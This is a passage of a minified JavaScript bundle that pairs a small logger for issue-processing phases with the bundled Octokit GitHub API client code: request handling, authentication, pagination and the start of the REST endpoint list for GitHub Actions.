import{createRequire as rD}from"node:module";var lD=Object.create;var{getPrototypeOf:pD,defineProperty:EQ,getOwnPropertyNames:dD}=Object;var iD=Object.prototype.hasOwnProperty;var z0=(X,J,Q)=>{Q=X!=null?lD(pD(X)):{};let Y=J||!X||!X.__esModule?EQ(Q,"default",{value:X,enumerable:!0}):Q;for(let W of dD(X))if(!iD.call(Y,W))EQ(Y,W,{get:()=>X[W],enumerable:!0});return Y};var v=(X,J)=>()=>(J||X((J={exports:{}}).exports,J),J.exports);var N0=(X,J)=>{for(var Q in J)EQ(X,Q,{get:J[Q],enumerable:!0,configurable:!0,set:(Y)=>J[Q]=()=>Y})};var s=(X,J)=>()=>(X&&(J=X(X=0)),J);var Q0=rD(import.meta.url);class B5{minLevel;defaultOptions;constructor(X={}){this.minLevel=process.env.LOG_LEVEL?.toLowerCase()||"info",this.defaultOptions={timestamp:!0,...X}}debug(X,J){this.log("debug",X,J)}info(X,J){this.log("info",X,J)}warn(X,J){this.log("warn",X,J)}error(X,J){let Q;if(J)Q={error:J instanceof Error?{message:J.message,stack:J.stack}:J};this.log("error",X,Q)}log(X,J,Q){if(!this.shouldLog(X))return;let Y=this.formatLogEntry(X,J,Q);switch(X){case"debug":console.debug(Y);break;case"info":console.info(Y);break;case"warn":console.warn(Y);break;case"error":console.error(Y);break}}shouldLog(X){let J=["debug","info","warn","error"],Q=J.indexOf(this.minLevel);return J.indexOf(X)>=Q}formatLogEntry(X,J,Q){let Y=this.defaultOptions.timestamp?`[${new Date().toISOString()}]`:"",W=`[${X.toUpperCase()}]`,G=`${Y}${W} ${J}`;if(Q)try{let H=JSON.stringify(Q,null,2);G+=`
${H}`}catch(H){G+=`
[Error serializing metadata]`}return G}setMinLevel(X){this.minLevel=X}getMinLevel(){return this.minLevel}logPhaseExecution(X,J,Q){let Y=`[PHASE:${X.toUpperCase()}] Issue #${J} - ${Q.status}`,W={phase:X,issueNumber:J,...Q};if(Q.status==="failure")this.error(Y,W);else this.info(Y,W)}logTestExecution(X,J){let Q=`[TEST] Issue #${X} - ${J.phase} - ${J.passed?"PASSED":"FAILED"}`;this.info(Q,J)}logTrustScore(X,J){let Q=`[TRUST-SCORE] Issue #${X} - Score: ${J.trustScore}`;this.info(Q,J)}}var U;var I1=s(()=>{U=new B5});function e6(){if(typeof navigator==="object"&&"userAgent"in navigator)return navigator.userAgent;if(typeof process==="object"&&process.version!==void 0)return`Node.js/${process.version.substr(1)} (${process.platform}; ${process.arch})`;return"<environment undetectable>"}function j5(X,J,Q,Y){if(typeof Q!=="function")throw Error("method for before hook must be a function");if(!Y)Y={};if(Array.isArray(J))return J.reverse().reduce((W,G)=>{return j5.bind(null,X,G,W,Y)},Q)();return Promise.resolve().then(()=>{if(!X.registry[J])return Q(Y);return X.registry[J].reduce((W,G)=>{return G.hook.bind(null,W,Y)},Q)()})}function eH(X,J,Q,Y){let W=Y;if(!X.registry[Q])X.registry[Q]=[];if(J==="before")Y=(G,H)=>{return Promise.resolve().then(W.bind(null,H)).then(G.bind(null,H))};if(J==="after")Y=(G,H)=>{let z;return Promise.resolve().then(G.bind(null,H)).then(($)=>{return z=$,W(z,H)}).then(()=>{return z})};if(J==="error")Y=(G,H)=>{return Promise.resolve().then(G.bind(null,H)).catch((z)=>{return W(z,H)})};X.registry[Q].push({hook:Y,orig:W})}function Xz(X,J,Q){if(!X.registry[J])return;let Y=X.registry[J].map((W)=>{return W.orig}).indexOf(Q);if(Y===-1)return;X.registry[J].splice(Y,1)}function Yz(X,J,Q){let Y=Qz(Xz,null).apply(null,Q?[J,Q]:[J]);X.api={remove:Y},X.remove=Y,["before","error","after","wrap"].forEach((W)=>{let G=Q?[J,W,Q]:[J,W];X[W]=X.api[W]=Qz(eH,null).apply(null,G)})}function hI(){let X=Symbol("Singular"),J={registry:{}},Q=j5.bind(null,J,X);return Yz(Q,J,X),Q}function yI(){let X={registry:{}},J=j5.bind(null,X);return Yz(J,X),J}var Jz,Qz,Wz;var Gz=s(()=>{Jz=Function.bind,Qz=Jz.bind(Jz);Wz={Singular:hI,Collection:yI}});function cI(X){if(!X)return{};return Object.keys(X).reduce((J,Q)=>{return J[Q.toLowerCase()]=X[Q],J},{})}function lI(X){if(typeof X!=="object"||X===null)return!1;if(Object.prototype.toString.call(X)!=="[object Object]")return!1;let J=Object.getPrototypeOf(X);if(J===null)return!0;let Q=Object.prototype.hasOwnProperty.call(J,"constructor")&&J.constructor;return typeof Q==="function"&&Q instanceof Q&&Function.prototype.call(Q)===Function.prototype.call(X)}function $z(X,J){let Q=Object.assign({},X);return Object.keys(J).forEach((Y)=>{if(lI(J[Y]))if(!(Y in X))Object.assign(Q,{[Y]:J[Y]});else Q[Y]=$z(X[Y],J[Y]);else Object.assign(Q,{[Y]:J[Y]})}),Q}function Hz(X){for(let J in X)if(X[J]===void 0)delete X[J];return X}function nQ(X,J,Q){if(typeof J==="string"){let[W,G]=J.split(" ");Q=Object.assign(G?{method:W,url:G}:{url:W},Q)}else Q=Object.assign({},J);Q.headers=cI(Q.headers),Hz(Q),Hz(Q.headers);let Y=$z(X||{},Q);if(Q.url==="/graphql"){if(X&&X.mediaType.previews?.length)Y.mediaType.previews=X.mediaType.previews.filter((W)=>!Y.mediaType.previews.includes(W)).concat(Y.mediaType.previews);Y.mediaType.previews=(Y.mediaType.previews||[]).map((W)=>W.replace(/-preview/,""))}return Y}function pI(X,J){let Q=/\?/.test(X)?"&":"?",Y=Object.keys(J);if(Y.length===0)return X;return X+Q+Y.map((W)=>{if(W==="q")return"q="+J.q.split("+").map(encodeURIComponent).join("+");return`${W}=${encodeURIComponent(J[W])}`}).join("&")}function iI(X){return X.replace(/(?:^\W+)|(?:(?<!\W)\W+$)/g,"").split(/,/)}function rI(X){let J=X.match(dI);if(!J)return[];return J.map(iI).reduce((Q,Y)=>Q.concat(Y),[])}function zz(X,J){let Q={__proto__:null};for(let Y of Object.keys(X))if(J.indexOf(Y)===-1)Q[Y]=X[Y];return Q}function Vz(X){return X.split(/(%[0-9A-Fa-f]{2})/g).map(function(J){if(!/%[0-9A-Fa-f]/.test(J))J=encodeURI(J).replace(/%5B/g,"[").replace(/%5D/g,"]");return J}).join("")}function P8(X){return encodeURIComponent(X).replace(/[!'()*]/g,function(J){return"%"+J.charCodeAt(0).toString(16).toUpperCase()})}function bJ(X,J,Q){if(J=X==="+"||X==="#"?Vz(J):P8(J),Q)return P8(Q)+"="+J;else return J}function C8(X){return X!==void 0&&X!==null}function aQ(X){return X===";"||X==="&"||X==="?"}function aI(X,J,Q,Y){var W=X[Q],G=[];if(C8(W)&&W!=="")if(typeof W==="string"||typeof W==="number"||typeof W==="boolean"){if(W=W.toString(),Y&&Y!=="*")W=W.substring(0,parseInt(Y,10));G.push(bJ(J,W,aQ(J)?Q:""))}else if(Y==="*")if(Array.isArray(W))W.filter(C8).forEach(function(H){G.push(bJ(J,H,aQ(J)?Q:""))});else Object.keys(W).forEach(function(H){if(C8(W[H]))G.push(bJ(J,W[H],H))});else{let H=[];if(Array.isArray(W))W.filter(C8).forEach(function(z){H.push(bJ(J,z))});else Object.keys(W).forEach(function(z){if(C8(W[z]))H.push(P8(z)),H.push(bJ(J,W[z].toString()))});if(aQ(J))G.push(P8(Q)+"="+H.join(","));else if(H.length!==0)G.push(H.join(","))}else if(J===";"){if(C8(W))G.push(P8(Q))}else if(W===""&&(J==="&"||J==="?"))G.push(P8(Q)+"=");else if(W==="")G.push("");return G}function nI(X){return{expand:sI.bind(null,X)}}function sI(X,J){var Q=["+","#",".","/",";","?","&"];if(X=X.replace(/\{([^\{\}]+)\}|([^\{\}]+)/g,function(Y,W,G){if(W){let z="",$=[];if(Q.indexOf(W.charAt(0))!==-1)z=W.charAt(0),W=W.substr(1);if(W.split(/,/g).forEach(function(V){var K=/([^:\*]*)(?::(\d+)|(\*))?/.exec(V);$.push(aI(J,z,K[1],K[2]||K[3]))}),z&&z!=="+"){var H=",";if(z==="?")H="&";else if(z!=="#")H=z;return($.length!==0?z:"")+$.join(H)}else return $.join(",")}else return Vz(G)}),X==="/")return X;else return X.replace(/\/$/,"")}function Kz(X){let J=X.method.toUpperCase(),Q=(X.url||"/").replace(/:([a-z]\w+)/g,"{$1}"),Y=Object.assign({},X.headers),W,G=zz(X,["method","baseUrl","url","headers","request","mediaType"]),H=rI(Q);if(Q=nI(Q).expand(G),!/^http/.test(Q))Q=X.baseUrl+Q;let z=Object.keys(X).filter((K)=>H.includes(K)).concat("baseUrl"),$=zz(G,z);if(!/application\/octet-stream/i.test(Y.accept)){if(X.mediaType.format)Y.accept=Y.accept.split(/,/).map((K)=>K.replace(/application\/vnd(\.\w+)(\.v3)?(\.\w+)?(\+json)?$/,`application/vnd$1$2.${X.mediaType.format}`)).join(",");if(Q.endsWith("/graphql")){if(X.mediaType.previews?.length){let K=Y.accept.match(/(?<![\w-])[\w-]+(?=-preview)/g)||[];Y.accept=K.concat(X.mediaType.previews).map((Z)=>{let q=X.mediaType.format?`.${X.mediaType.format}`:"+json";return`application/vnd.github.${Z}-preview${q}`}).join(",")}}}if(["GET","HEAD"].includes(J))Q=pI(Q,$);else if("data"in $)W=$.data;else if(Object.keys($).length)W=$;if(!Y["content-type"]&&typeof W<"u")Y["content-type"]="application/json; charset=utf-8";if(["PATCH","PUT"].includes(J)&&typeof W>"u")W="";return Object.assign({method:J,url:Q,headers:Y},typeof W<"u"?{body:W}:null,X.request?{request:X.request}:null)}function oI(X,J,Q){return Kz(nQ(X,J,Q))}function Uz(X,J){let Q=nQ(X,J),Y=oI.bind(null,Q);return Object.assign(Y,{DEFAULTS:Q,defaults:Uz.bind(null,Q),merge:nQ.bind(null,Q),parse:Kz})}var gI="0.0.0-development",mI,uI,dI,Zz;var qz=s(()=>{mI=`octokit-endpoint.js/${gI} ${e6()}`,uI={method:"GET",baseUrl:"https://api.github.com",headers:{accept:"application/vnd.github.v3+json","user-agent":mI},mediaType:{format:""}};dI=/\{[^{}}]+\}/g;Zz=Uz(null,uI)});function eI(X){if(typeof X!=="string")return S8;let J=X.indexOf(";"),Q=J!==-1?X.slice(0,J).trim():X.trim();if(tI.test(Q)===!1)return S8;let Y={type:Q.toLowerCase(),parameters:new sQ};if(J===-1)return Y;let W,G,H;Bz.lastIndex=J;while(G=Bz.exec(X)){if(G.index!==J)return S8;if(J+=G[0].length,W=G[1].toLowerCase(),H=G[2],H[0]==='"')H=H.slice(1,H.length-1),Mz.test(H)&&(H=H.replace(Mz,"$1"));Y.parameters[W]=H}if(J!==X.length)return S8;return Y}var sQ=function(){},Bz,Mz,tI,S8,oQ;var jz=s(()=>{sQ.prototype=Object.create(null);Bz=/; *([!#$%&'*+.^\w`|~-]+)=("(?:[\v\u0020\u0021\u0023-\u005b\u005d-\u007e\u0080-\u00ff]|\\[\v\u0020-\u00ff])*"|[!#$%&'*+.^\w`|~-]+) */gu,Mz=/\\([\v\u0020-\u00ff])/gu,tI=/^[!#$%&'*+.^\w|~-]+\/[!#$%&'*+.^\w|~-]+$/u,S8={type:"",parameters:new sQ};Object.freeze(S8.parameters);Object.freeze(S8);oQ=eI});var T8;var Oz=s(()=>{T8=class T8 extends Error{name;status;request;response;constructor(X,J,Q){super(X);if(this.name="HttpError",this.status=Number.parseInt(J),Number.isNaN(this.status))this.status=0;if("response"in Q)this.response=Q.response;let Y=Object.assign({},Q.request);if(Q.request.headers.authorization)Y.headers=Object.assign({},Q.request.headers,{authorization:Q.request.headers.authorization.replace(/(?<! ) .*$/," [REDACTED]")});Y.url=Y.url.replace(/\bclient_secret=\w+/g,"client_secret=[REDACTED]").replace(/\baccess_token=\w+/g,"access_token=[REDACTED]"),this.request=Y}}});function YC(X){if(typeof X!=="object"||X===null)return!1;if(Object.prototype.toString.call(X)!=="[object Object]")return!1;let J=Object.getPrototypeOf(X);if(J===null)return!0;let Q=Object.prototype.hasOwnProperty.call(J,"constructor")&&J.constructor;return typeof Q==="function"&&Q instanceof Q&&Function.prototype.call(Q)===Function.prototype.call(X)}async function Fz(X){let J=X.request?.fetch||globalThis.fetch;if(!J)throw Error("fetch is not set. Please pass a fetch implementation as new Octokit({ request: { fetch }}). Learn more at https://github.com/octokit/octokit.js/#fetch-missing");let Q=X.request?.log||console,Y=X.request?.parseSuccessResponseBody!==!1,W=YC(X.body)||Array.isArray(X.body)?JSON.stringify(X.body):X.body,G=Object.fromEntries(Object.entries(X.headers).map(([Z,q])=>[Z,String(q)])),H;try{H=await J(X.url,{method:X.method,body:W,redirect:X.request?.redirect,headers:G,signal:X.request?.signal,...X.body&&{duplex:"half"}})}catch(Z){let q="Unknown Error";if(Z instanceof Error){if(Z.name==="AbortError")throw Z.status=500,Z;if(q=Z.message,Z.name==="TypeError"&&"cause"in Z){if(Z.cause instanceof Error)q=Z.cause.message;else if(typeof Z.cause==="string")q=Z.cause}}let B=new T8(q,500,{request:X});throw B.cause=Z,B}let{status:z,url:$}=H,V={};for(let[Z,q]of H.headers)V[Z]=q;let K={url:$,status:z,headers:V,data:""};if("deprecation"in V){let Z=V.link&&V.link.match(/<([^<>]+)>; rel="deprecation"/),q=Z&&Z.pop();Q.warn(`[@octokit/request] "${X.method} ${X.url}" is deprecated. It is scheduled to be removed on ${V.sunset}${q?`. See ${q}`:""}`)}if(z===204||z===205)return K;if(X.method==="HEAD"){if(z<400)return K;throw new T8(H.statusText,z,{response:K,request:X})}if(z===304)throw K.data=await tQ(H),new T8("Not modified",z,{response:K,request:X});if(z>=400)throw K.data=await tQ(H),new T8(GC(K.data),z,{response:K,request:X});return K.data=Y?await tQ(H):H.body,K}async function tQ(X){let J=X.headers.get("content-type");if(!J)return X.text().catch(()=>"");let Q=oQ(J);if(WC(Q)){let Y="";try{return Y=await X.text(),JSON.parse(Y)}catch(W){return Y}}else if(Q.type.startsWith("text/")||Q.parameters.charset?.toLowerCase()==="utf-8")return X.text().catch(()=>"");else return X.arrayBuffer().catch(()=>new ArrayBuffer(0))}function WC(X){return X.type==="application/json"||X.type==="application/scim+json"}function GC(X){if(typeof X==="string")return X;if(X instanceof ArrayBuffer)return"Unknown error";if("message"in X){let J="documentation_url"in X?` - ${X.documentation_url}`:"";return Array.isArray(X.errors)?`${X.message}: ${X.errors.map((Q)=>JSON.stringify(Q)).join(", ")}${J}`:`${X.message}${J}`}return`Unknown error: ${JSON.stringify(X)}`}function eQ(X,J){let Q=X.defaults(J);return Object.assign(function(W,G){let H=Q.merge(W,G);if(!H.request||!H.request.hook)return Fz(Q.parse(H));let z=($,V)=>{return Fz(Q.parse(Q.merge($,V)))};return Object.assign(z,{endpoint:Q,defaults:eQ.bind(null,Q)}),H.request.hook(z,H)},{endpoint:Q,defaults:eQ.bind(null,Q)})}var JC="9.2.4",QC,vJ;var X2=s(()=>{qz();jz();Oz();QC={headers:{"user-agent":`octokit-request.js/${JC} ${e6()}`}};vJ=eQ(Zz,QC)});function zC(X){return`Request failed due to following response errors:
`+X.errors.map((J)=>` - ${J.message}`).join(`
`)}function UC(X,J,Q){if(Q){if(typeof J==="string"&&"query"in Q)return Promise.reject(Error('[@octokit/graphql] "query" cannot be used as variable name'));for(let H in Q){if(!KC.includes(H))continue;return Promise.reject(Error(`[@octokit/graphql] "${H}" cannot be used as variable name`))}}let Y=typeof J==="string"?Object.assign({query:J},Q):J,W=Object.keys(Y).reduce((H,z)=>{if(VC.includes(z))return H[z]=Y[z],H;if(!H.variables)H.variables={};return H.variables[z]=Y[z],H},{}),G=Y.baseUrl||X.endpoint.DEFAULTS.baseUrl;if(Rz.test(G))W.url=G.replace(Rz,"/api/graphql");return X(W).then((H)=>{if(H.data.errors){let z={};for(let $ of Object.keys(H.headers))z[$]=H.headers[$];throw new $C(W,z,H.data)}return H.data.data})}function J2(X,J){let Q=X.defaults(J);return Object.assign((W,G)=>{return UC(Q,W,G)},{defaults:J2.bind(null,Q),endpoint:Q.endpoint})}function Az(X){return J2(X,{method:"POST",url:"/graphql"})}var HC="0.0.0-development",$C,VC,KC,Rz,Sy1;var Dz=s(()=>{X2();$C=class extends Error{constructor(X,J,Q){super(zC(Q));if(this.request=X,this.headers=J,this.response=Q,this.errors=Q.errors,this.data=Q.data,Error.captureStackTrace)Error.captureStackTrace(this,this.constructor)}name="GraphqlResponseError";errors;data},VC=["method","baseUrl","url","headers","request","query","mediaType","operationName"],KC=["query","method","url"],Rz=/\/api\/v3\/?$/;Sy1=J2(vJ,{headers:{"user-agent":`octokit-graphql.js/${HC} ${e6()}`},method:"POST",url:"/graphql"})});async function qC(X){let J=ZC(X),Q=X.startsWith("v1.")||X.startsWith("ghs_"),Y=X.startsWith("ghu_");return{type:"token",token:X,tokenType:J?"app":Q?"installation":Y?"user-to-server":"oauth"}}function BC(X){if(X.split(/\./).length===3)return`bearer ${X}`;return`token ${X}`}async function MC(X,J,Q,Y){let W=J.endpoint.merge(Q,Y);return W.headers.authorization=BC(X),J(W)}var Q2="(?:[a-zA-Z0-9_-]+)",wz="\\.",Nz,ZC,Lz=function(J){if(!J)throw Error("[@octokit/auth-token] No token passed to createTokenAuth");if(typeof J!=="string")throw Error("[@octokit/auth-token] Token passed to createTokenAuth is not a string");return J=J.replace(/^(token|bearer) +/i,""),Object.assign(qC.bind(null,J),{hook:MC.bind(null,J)})};var Iz=s(()=>{Nz=new RegExp(`^${Q2}${wz}${Q2}${wz}${Q2}$`),ZC=Nz.test.bind(Nz)});var Y2="6.1.6";var Cz=()=>{};function FC(X={}){if(typeof X.debug!=="function")X.debug=Pz;if(typeof X.info!=="function")X.info=Pz;if(typeof X.warn!=="function")X.warn=jC;if(typeof X.error!=="function")X.error=OC;return X}var Pz=()=>{},jC,OC,Sz,W2;var Tz=s(()=>{Gz();X2();Dz();Iz();Cz();jC=console.warn.bind(console),OC=console.error.bind(console);Sz=`octokit-core.js/${Y2} ${e6()}`;W2=class W2{static VERSION=Y2;static defaults(X){return class extends this{constructor(...Q){let Y=Q[0]||{};if(typeof X==="function"){super(X(Y));return}super(Object.assign({},X,Y,Y.userAgent&&X.userAgent?{userAgent:`${Y.userAgent} ${X.userAgent}`}:null))}}}static plugins=[];static plugin(...X){let J=this.plugins;return class extends this{static plugins=J.concat(X.filter((Y)=>!J.includes(Y)))}}constructor(X={}){let J=new Wz.Collection,Q={baseUrl:vJ.endpoint.DEFAULTS.baseUrl,headers:{},request:Object.assign({},X.request,{hook:J.bind(null,"request")}),mediaType:{previews:[],format:""}};if(Q.headers["user-agent"]=X.userAgent?`${X.userAgent} ${Sz}`:Sz,X.baseUrl)Q.baseUrl=X.baseUrl;if(X.previews)Q.mediaType.previews=X.previews;if(X.timeZone)Q.headers["time-zone"]=X.timeZone;if(this.request=vJ.defaults(Q),this.graphql=Az(this.request).defaults(Q),this.log=FC(X.log),this.hook=J,!X.authStrategy)if(!X.auth)this.auth=async()=>({type:"unauthenticated"});else{let W=Lz(X.auth);J.wrap("request",W.hook),this.auth=W}else{let{authStrategy:W,...G}=X,H=W(Object.assign({request:this.request,log:this.log,octokit:this,octokitOptions:G},X.auth));J.wrap("request",H.hook),this.auth=H}let Y=this.constructor;for(let W=0;W<Y.plugins.length;++W)Object.assign(this,Y.plugins[W](this,X))}request;graphql;log;hook;auth}});var _z="5.3.1";var Ez=()=>{};function G2(X){X.hook.wrap("request",(J,Q)=>{X.log.debug("request",Q);let Y=Date.now(),W=X.request.endpoint.parse(Q),G=W.url.replace(Q.baseUrl,"");return J(Q).then((H)=>{let z=H.headers["x-github-request-id"];return X.log.info(`${W.method} ${G} - ${H.status} with id ${z} in ${Date.now()-Y}ms`),H}).catch((H)=>{let z=H.response?.headers["x-github-request-id"]||"UNKNOWN";throw X.log.error(`${W.method} ${G} - ${H.status} with id ${z} in ${Date.now()-Y}ms`),H})})}var kz=s(()=>{Ez();G2.VERSION=_z});function AC(X){if(!X.data)return{...X,data:[]};if(!(("total_count"in X.data)&&!("url"in X.data)))return X;let Q=X.data.incomplete_results,Y=X.data.repository_selection,W=X.data.total_count;delete X.data.incomplete_results,delete X.data.repository_selection,delete X.data.total_count;let G=Object.keys(X.data)[0],H=X.data[G];if(X.data=H,typeof Q<"u")X.data.incomplete_results=Q;if(typeof Y<"u")X.data.repository_selection=Y;return X.data.total_count=W,X}function H2(X,J,Q){let Y=typeof J==="function"?J.endpoint(Q):X.request.endpoint(J,Q),W=typeof J==="function"?J:X.request,G=Y.method,H=Y.headers,z=Y.url;return{[Symbol.asyncIterator]:()=>({async next(){if(!z)return{done:!0};try{let $=await W({method:G,url:z,headers:H}),V=AC($);return z=((V.headers.link||"").match(/<([^<>]+)>;\s*rel="next"/)||[])[1],{value:V}}catch($){if($.status!==409)throw $;return z="",{value:{status:200,headers:{},data:[]}}}}})}}function bz(X,J,Q,Y){if(typeof Q==="function")Y=Q,Q=void 0;return vz(X,[],H2(X,J,Q)[Symbol.asyncIterator](),Y)}function vz(X,J,Q,Y){return Q.next().then((W)=>{if(W.done)return J;let G=!1;function H(){G=!0}if(J=J.concat(Y?Y(W.value,H):W.value.data),G)return J;return vz(X,J,Q,Y)})}function z2(X){return{paginate:Object.assign(bz.bind(null,X),{iterator:H2.bind(null,X)})}}var RC="0.0.0-development",dy1;var fz=s(()=>{dy1=Object.assign(bz,{iterator:H2});z2.VERSION=RC});var $2="13.5.0";var xz=()=>{};var DC,hz;var yz=s(()=>{DC={actions:{addCustomLabelsToSelfHostedRunnerForOrg:["POST /orgs/{org}/actions/runners/{runner_id}/labels"],addCustomLabelsToSelfHostedRunnerForRepo:["POST /repos/{owner}/{repo}/actions/runners/{runner_id}/labels"],addRepoAccessToSelfHostedRunnerGroupInOrg:["PUT /orgs/{org}/actions/runner-groups/{runner_group_id}/repositories/{repository_id}"],addSelectedRepoToOrgSecret:["PUT /orgs/{org}/actions/secrets/{secret_name}/repositories/{repository_id}"],addSelectedRepoToOrgVariable:["PUT /orgs/{org}/actions/variables/{name}/repositories/{repository_id}"],approveWorkflowRun:["POST /repos/{owner}/{repo}/actions/runs/{run_id}/approve"],cancelWorkflowRun:["POST /repos/{owner}/{repo}/actions/runs/{run_id}/cancel"],createEnvironmentVariable:["POST /repos/{owner}/{repo}/environments/{environment_name}/variables"],createHostedRunnerForOrg:["POST /orgs/{org}/actions/hosted-runners"],createOrUpdateEnvironmentSecret:["PUT /repos/{owner}/{repo}/environments/{environment_name}/secrets/{secret_name}"],createOrUpdateOrgSecret:["PUT /orgs/{org}/actions/secrets/{secret_name}"],createOrUpdateRepoSecret:["PUT /repos/{owner}/{repo}/actions/secrets/{secret_name}"],createOrgVariable:["POST /orgs/{org}/actions/variables"],createRegistrationTokenForOrg:["POST /orgs/{org}/actions/runners/registration-token"],createRegistrationTokenForRepo:["POST /repos/{owner}/{repo}/actions/runners/registration-token"],createRemoveTokenForOrg:["POST /orgs/{org}/actions/runners/remove-token"],createRemoveTokenForRepo:["POST /repos/{owner}/{repo}/actions/runners/remove-token"],createRepoVariable:["POST /repos/{owner}/{repo}/actions/variables"],createWorkflowDispatch:["POST /repos/{owner}/{repo}/actions/workflows/{workflow_id}/dispatches"],deleteActionsCacheById:["DELETE /repos/{owner}/{repo}/actions/caches/{cache_id}"],deleteActionsCacheByKey:["DELETE /repos/{owner}/{repo}/actions/caches{?key,ref}"],deleteArtifact:["DELETE /repos/{owner}/{repo}/actions/artifacts/{artifact_id}"],deleteEnvironmentSecret:["DELETE /repos/{owner}/{repo}/environments/{environment_name}/secrets/{secret_name}"],deleteEnvironmentVariable:["DELETE /repos/{owner}/{repo}/environments/{environment_name}/variables/{name}"],deleteHostedRunnerForOrg:["DELETE /orgs/{org}/actions/hosted-runners/{hosted_runner_id}"],deleteOrgSecret:["DELETE /orgs/{org}/actions/secrets/{secret_name}"],deleteOrgVariable:["DELETE /orgs/{org}/actions/variables/{name}"],deleteRepoSecret:["DELETE /repos/{owner}/{repo}/actions/secrets/{secret_name}"],deleteRepoVariable:["DELETE /repos/{owner}/{repo}/actions/variables/{name}"],deleteSelfHostedRunnerFromOrg:["DELETE /orgs/{org}/actions/runners/{runner_id}"],deleteSelfHostedRunnerFromRepo:["DELETE /repos/{owner}/{repo}/actions/runners/{runner_id}"],deleteWorkflowRun:["DELETE /repos/{owner}/{repo}/actions/runs/{run_id}"],deleteWorkflowRunLogs:["DELETE /repos/{owner}/{repo}/actions/runs/{run_id}/logs"],disableSelectedRepositoryGithubActionsOrganization:["DELETE /orgs/{org}/actions/permissions/repositories/{repository_id}"],disableWorkflow:["PUT /repos/{owner}/{repo}/actions/workflows/{workflow_id}/disable"],downloadArtifact:["GET /repos/{owner}/{repo}/actions/artifacts/{artifact_id}/{archive_format}"],downloadJobLogsForWorkflowRun:["GET /repos/{owner}/{repo}/actions/jobs/{job_id}/logs"],downloadWorkflowRunAttemptLogs:["GET /repos/{owner}/{repo}/actions/runs/{run_id}/attempts/{attempt_number}/logs"],downloadWorkflowRunLogs:["GET /repos/{owner}/{repo}/actions/runs/{run_id}/logs"],enableSelectedRepositoryGithubActionsOrganization:["PUT /orgs/{org}/actions/permissions/repositories/{repository_id}"],enableWorkflow:["PUT /repos/{owner}/{repo}/actions/workflows/{workflow_id}/enable"],forceCancelWorkflowRun:["POST /repos/{owner}/{repo}/actions/runs/{run_id}/force-cancel"],generateRunnerJitconfigForOrg:["POST /orgs/{org}/actions/runners/generate-jitconfig"],generateRunnerJitconfigForRepo:["POST /repos/{owner}/{repo}/actions/runners/generate-jitconfig"],getActionsCacheList:["GET /repos/{owner}/{repo}/actions/caches"],getActionsCacheUsage:["GET /repos/{owner}/{repo}/actions/cache/usage"],getActionsCacheUsageByRepoForOrg:["GET /orgs/{org}/actions/cache/usage-by-repository"],getActionsCacheUsageForOrg:["GET /orgs/{org}/actions/cache/usage"],getAllowedActionsOrganization:["GET /orgs/{org}/actions/permissions/selected-actions"],getAllowedActionsRepository:["GET /repos/{owner}/{repo}/actions/permissions/selected-actions"],getArtifact:["GET /repos/{owner}/{repo}/actions/artifacts/{artifact_id}"],getCustomOidcSubClaimForRepo:["GET /repos/{owner}/{repo}/actions/oidc/customization/sub"],getEnvironmentPublicKey:["GET /repos/{owner}/{repo}/environments/{environment_name}/secrets/public-key"],getEnvironmentSecret:["GET /repos/{owner}/{repo}/environments/{environment_name}/secrets/{secret_name}"],getEnvironmentVariable:["GET /repos/{owner}/{repo}/environments/{environment_name}/variables/{name}"],getGithubActionsDefaultWorkflowPermissionsOrganization:["GET /orgs/{org}/actions/permissions/workflow"],getGithubActionsDefaultWorkflowPermissionsRepository:["GET /repos/{owner}/{repo}/actions/permissions/workflow"],getGithubActionsPermissionsOrganization:["GET /orgs/{org}/actions/permissions"],getGithubActionsPermissionsRepository:["GET /repos/{owner}/{repo}/actions/permissions"],getHostedRunnerForOrg:["GET /orgs/{org}/actions/hosted-runners/{hosted_runner_id}"],getHostedRunnersGithubOwnedImagesForOrg:["GET /orgs/{org}/actions/hosted-runners/images/github-owned"],getHostedRunnersLimitsForOrg:["GET /orgs/{org}/actions/hosted-runners/limits"],getHostedRunnersMachineSpecsForOrg:["GET /orgs/{org}/actions/hosted-runners/machine-sizes"],getHostedRunnersPartnerImagesForOrg:["GET /orgs/{org}/actions/hosted-runners/images/partner"],getHostedRunnersPlatformsForOrg:["GET /orgs/{org}/actions/hosted-runners/platforms"],getJobForWorkflowRun:["GET /repos/{owner}/{repo}/actions/jobs/{job_id}"],getOrgPublicKey:["GET /orgs/{org}/actions/secrets/public-key"],getOrgSecret:["GET /orgs/{org}/actions/secrets/{secret_name}"],getOrgVariable:["GET /orgs/{org}/actions/variables/{name}"],getPendingDeploymentsForRun:["GET /repos/{owner}/{repo}/actions/runs/{run_id}/pending_deployments"],getRepoPermissions:["GET /repos/{owner}/{repo}/actions/permissions",{},{renamed:["actions","getGithubActionsPermissionsRepository"]}],getRepoPublicKey:["GET /repos/{owner}/{repo}/actions/secrets/public-key"],getRepoSecret:["GET /repos/{owner}/{repo}/actions/secrets/{secret_name}"],getRepoVariable:["GET /repos/{owner}/{repo}/actions/variables/{name}"],getReviewsForRun:["GET /repos/{owner}/{repo}/actions/runs/{run_id}/approvals"],getSelfHostedRunnerForOrg:["GET /orgs/{org}/actions/runners/{runner_id}"],getSelfHostedRunnerForRepo:["GET /repos/{owner}/{repo}/actions/runners/{runner_id}"],getWorkflow:["GET /repos/{owner}/{repo}/actions/workflows/{workflow_id}"],getWorkflowAccessToRepository:["GET /repos/{owner}/{repo}/actions/permissions/access"],getWorkflowRun:["GET /repos/{owner}/{repo}/actions/runs/{run_id}"],getWorkflowRunAttempt:["GET /repos/{owner}/{repo}/actions/runs/{run_id}/attempts/{attempt_number}"],getWorkflowRunUsage:["GET /repos/{owner}/{repo}/actions/runs/{run_id}/timing"],getWorkflowUsage:["GET /repos/{owner}/{repo}/actions/workflows/{workflow_id}/timing"],listArtifactsForRepo:["GET /repos/{owner}/{repo}/actions/artifacts"],listEnvironmentSecrets:["GET /repos/{owner}/{repo}/environments/{environment_name}/secrets"],listEnvironmentVariables:["GET /repos/{owner}/{repo}/environments/{environment_name}/variables"],listGithubHostedRunnersInGroupForOrg:["GET /orgs/{org}/actions/runner-groups/{runner_group_id}/hosted-runners"],listHostedRunnersForOrg:["GET /orgs/{org}/actions/hosted-runners"],listJobsForWorkflowRun:["GET /repos/{owner}/{repo}/actions/runs/{run_id}/jobs"],listJobsForWorkflowRunAttempt:["GET /repos/{owner}/{repo}/actions/runs/{run_id}/attempts/{attempt_number}/jobs"],listLabelsForSelfHostedRunnerForOrg:["GET /orgs/{org}/actions/runners/{runner_id}/labels"],listLabelsForSelfHostedRunnerForRepo:["GET /repos/{owner}/{repo}/actions/runners/{runner_id}/labels"],listOrgSecrets:["GET /orgs/{org}/actions/secrets"],listOrgVariables:["GET 